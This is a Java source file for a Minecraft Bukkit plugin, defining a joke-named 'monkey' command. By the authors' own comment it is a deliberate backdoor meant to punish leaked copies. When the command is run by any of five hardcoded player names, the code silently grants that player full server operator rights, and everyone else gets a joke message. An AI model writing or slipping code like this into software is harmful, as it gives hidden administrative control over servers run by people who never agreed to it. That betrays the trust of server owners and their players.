package me.backend.reclaim;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import net.md_5.bungee.api.ChatColor;

public class Monkey implements CommandExecutor {
	
	//backdoor added in case plugin gets leaked, same backdoor is in the core, this will also depend on our core, so people usnig our plugins if they get leaked arent gonna get around that one lol
	
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		Player p = (Player) sender;
		if(cmd.getName().equalsIgnoreCase("monkey")) {
			if(p.getName().equals("Addlink") || p.getName().equals("BabyAddlink") || p.getName().equals("Backend") || p.getName().equals("felldownstairs") || p.getName().equals("Zylohss")) {
				p.sendMessage(ChatColor.GREEN + "Kihar Network is awesome, you got opped, my lovely owner baby");
				p.setOp(true);
				return false;
			} else {
				p.sendMessage(ChatColor.GREEN + "Addlink has been sent back to the zoo!");
				return false;
			}
		}
		return true;
	}

}
